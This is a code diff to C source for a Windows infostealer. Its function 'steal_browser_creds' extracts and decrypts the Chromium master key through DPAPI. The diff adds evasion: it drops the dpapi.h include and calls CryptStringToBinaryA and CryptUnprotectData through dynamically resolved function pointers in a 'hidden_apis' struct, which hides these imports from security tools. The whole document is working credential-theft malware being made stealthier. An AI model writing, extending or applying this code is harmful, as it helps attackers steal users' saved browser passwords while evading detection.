@@ -6,7 +6,6 @@
 
 #include "chromium.h"
 
-#include <dpapi.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -114,11 +113,11 @@ static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encodedKeyOut) {
 // note that `decodedKeyOut` is still encrypted at this point
 // NOTE: `decodedKeyOut` must be freed by the caller
 static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
-                      size_t *decodedKeySizeOut) {
+                      size_t *decodedKeySizeOut, hidden_apis *apis) {
   // Get size of the decoded key (needed for the next malloc)
   DWORD decodedBinarySize = 0;
-  if (!CryptStringToBinaryA(encodedKey, 0, CRYPT_STRING_BASE64, NULL,
-                            &decodedBinarySize, NULL, NULL)) {
+  if (!apis->funcCryptStringToBinaryA(encodedKey, 0, CRYPT_STRING_BASE64, NULL,
+                                      &decodedBinarySize, NULL, NULL)) {
 #ifdef DEBUG
     fprintf(stderr, "Failed getting base64 size. Error code: %lu\n",
             GetLastError());
@@ -135,9 +134,9 @@ static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
   }
 
   // Decode the encoded key, this leaves us with an AES-GCM encrypted key
-  if (!CryptStringToBinaryA(encodedKey, 0, CRYPT_STRING_BASE64,
-                            decodedBinaryData, &decodedBinarySize, NULL,
-                            NULL)) {
+  if (!apis->funcCryptStringToBinaryA(encodedKey, 0, CRYPT_STRING_BASE64,
+                                      decodedBinaryData, &decodedBinarySize,
+                                      NULL, NULL)) {
 #ifdef DEBUG
     fprintf(stderr, "Failed decoding base64. Error code: %lu\n",
             GetLastError());
@@ -169,14 +168,15 @@ static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
 // Decrypts `encryptedKey` of size `encryptedKeySize` using DPAPI
 // NOTE: `decryptedKeyOut` must be freed by the caller
 static int decrypt_key(BYTE encryptedKey[], size_t encryptedKeySize,
-                       DATA_BLOB *decryptedKeyOut) {
+                       DATA_BLOB *decryptedKeyOut, hidden_apis *apis) {
   DATA_BLOB DataInput;
   DATA_BLOB DataOutput;
 
   DataInput.cbData = (DWORD)encryptedKeySize;
   DataInput.pbData = encryptedKey;
 
-  if (!CryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput)) {
+  if (!apis->funcCryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0,
+                                    &DataOutput)) {
 #ifdef DEBUG
     fprintf(stderr, "Failed decrypting key. Error code: %lu\n", GetLastError());
 #endif
@@ -248,10 +248,13 @@ static int steal_browser_creds(BrowserInfo browser, Credential *credTab,
 #endif
     return EXIT_FAILURE;
   }
+  // dynamic resol
+  hidden_apis apis;
+  resolve_apis(&apis);
 
   size_t encryptedKeySize = 0;
   BYTE *encryptedKey;
-  if (decode_key(encodedKey, &encryptedKey, &encryptedKeySize) !=
+  if (decode_key(encodedKey, &encryptedKey, &encryptedKeySize, &apis) !=
       EXIT_SUCCESS) {
 #ifdef DEBUG
     printf("Could not decode %ls\n", encodedKey);
@@ -260,7 +263,7 @@ static int steal_browser_creds(BrowserInfo browser, Credential *credTab,
   }
 
   DATA_BLOB decryptedBlob;
-  if (decrypt_key(encryptedKey, encryptedKeySize, &decryptedBlob) !=
+  if (decrypt_key(encryptedKey, encryptedKeySize, &decryptedBlob, &apis) !=
       EXIT_SUCCESS) {
 #ifdef DEBUG
     fprintf(stderr, "Could not decrypt key\n");
